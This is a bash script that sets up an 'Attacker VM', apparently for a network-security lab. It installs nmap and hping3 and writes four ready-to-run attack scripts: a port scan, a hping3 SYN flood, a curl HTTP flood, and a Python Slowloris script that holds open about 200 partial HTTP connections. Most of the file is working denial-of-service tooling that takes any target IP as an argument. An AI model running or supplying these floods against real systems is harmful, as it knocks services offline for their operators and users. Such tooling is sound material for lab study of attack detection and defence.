#!/bin/bash

# Attacker VM Setup Script
# Run this on the Attacker VM after installing Ubuntu

echo "=== Setting up Attacker VM ==="

# Update system
sudo apt update && sudo apt upgrade -y

# Install attack tools
echo "Installing attack tools..."
sudo apt install -y nmap hping3 curl wget netcat-openbsd python3 python3-pip

# Install Python packages
pip3 install requests

# Create attack scripts directory
mkdir -p ~/attacks
cd ~/attacks

# Port scan script
cat > port_scan.sh << 'EOF'
#!/bin/bash
TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./port_scan.sh <target-ip>"
    exit 1
fi
echo "=== Port Scanning $TARGET ==="
nmap -p 1-1000 -v $TARGET
EOF

# SYN flood script
cat > syn_flood.sh << 'EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-80}
if [ -z "$TARGET" ]; then
    echo "Usage: ./syn_flood.sh <target-ip> [port]"
    exit 1
fi
echo "=== SYN Flood Attack on $TARGET:$PORT ==="
echo "Press Ctrl+C to stop"
hping3 -S -p $PORT --flood $TARGET
EOF

# HTTP flood script
cat > http_flood.sh << 'EOF'
#!/bin/bash
TARGET=$1
PORT=${2:-5001}
if [ -z "$TARGET" ]; then
    echo "Usage: ./http_flood.sh <target-ip> [port]"
    exit 1
fi
echo "=== HTTP Flood Attack on http://$TARGET:$PORT ==="
for i in {1..1000}; do
    curl -s http://$TARGET:$PORT > /dev/null &
    if [ $((i % 100)) -eq 0 ]; then
        echo "Sent $i requests..."
    fi
done
wait
echo "Attack complete"
EOF

# Slowloris script
cat > slowloris.py << 'EOF'
#!/usr/bin/env python3
import socket
import time
import sys
import threading

target = sys.argv[1] if len(sys.argv) > 1 else None
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

if not target:
    print("Usage: python3 slowloris.py <target-ip> [port]")
    sys.exit(1)

sockets = []
def create_socket(i):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: Mozilla/5.0\r\n".encode())
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
        sockets.append(s)
        print(f"Socket {i} connected")
    except Exception as e:
        print(f"Error on socket {i}: {e}")

print(f"=== Slowloris Attack on {target}:{port} ===")
for i in range(200):
    threading.Thread(target=create_socket, args=(i,)).start()
    time.sleep(0.1)

print(f"Keeping {len(sockets)} connections open...")
print("Press Ctrl+C to stop")
try:
    time.sleep(300)
except KeyboardInterrupt:
    print("\nStopping attack...")
    for s in sockets:
        s.close()
EOF

# Make scripts executable
chmod +x *.sh
chmod +x *.py

echo ""
echo "=== Setup Complete ==="
echo ""
echo "Attack scripts created in ~/attacks/"
echo ""
echo "Usage:"
echo "  ./port_scan.sh <target-ip>"
echo "  ./syn_flood.sh <target-ip> [port]"
echo "  ./http_flood.sh <target-ip> [port]"
echo "  python3 slowloris.py <target-ip> [port]"
echo ""

